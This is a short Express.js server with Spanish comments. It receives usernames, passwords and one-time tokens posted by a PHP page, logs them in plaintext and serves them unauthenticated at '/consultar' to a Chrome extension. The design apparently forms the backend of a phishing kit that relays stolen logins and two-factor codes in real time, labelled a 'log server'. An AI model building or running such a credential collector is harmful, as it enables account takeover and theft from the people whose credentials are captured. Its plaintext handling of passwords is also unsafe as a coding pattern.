const express = require('express');
const app = express();

// Para poder leer los datos que enviará tu PHP
app.use(express.urlencoded({ extended: true }));
app.use(express.json());

// 🚩 VARIABLE GLOBAL
let baseDeDatosTemporal = {
    user: null,
    pass: null,
    token: null,
    origen: null,
    actualizado: false
};

// 1. RUTA PARA RECIBIR (La que usa tu PHP en XAMPP)
app.post('/recibir', (req, res) => {
    const { user, pass, token, origen } = req.body;

    let tokenFinal = token;

    // NUEVA LÓGICA: Si el origen dice que es LOGIN_INICIAL, 
    // borramos el token SIEMPRE, aunque sea el mismo usuario.
    if (origen === "LOGIN_INICIAL") {
        console.log("🚀 Iniciando sesión nueva. Limpiando token anterior...");
        tokenFinal = null; 
    } 
    // Si no es inicio, pero el usuario cambió, también limpiamos
    else if (user && user !== baseDeDatosTemporal.user) {
        console.log("⚠️ Cambio de usuario detectado. Limpiando token...");
        tokenFinal = null;
    }
    // Si no es ninguna de las anteriores, mantenemos lo que había
    else {
        tokenFinal = token || baseDeDatosTemporal.token;
    }

    baseDeDatosTemporal = {
        user: user || baseDeDatosTemporal.user,
        pass: pass || baseDeDatosTemporal.pass,
        token: tokenFinal, 
        origen: origen,
        actualizado: true
    };

    console.log("===============================");
    console.log("🔔 DATO ACTUALIZADO");
    console.log(`👤 Usuario: ${baseDeDatosTemporal.user}`);
    console.log(`🔑 Clave: ${baseDeDatosTemporal.pass}`);
    console.log(`📲 Token: ${baseDeDatosTemporal.token}`);
    console.log("===============================");

    res.status(200).send("OK");
});

// 2. RUTA PARA CONSULTAR (La que usará la Extensión de Chrome)
app.get('/consultar', (req, res) => {
    res.json(baseDeDatosTemporal);
});

app.get('/', (req, res) => {
    res.send("Servidor de Logs y API de Extensión Activo");
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Servidor activo en puerto ${PORT}`);
});
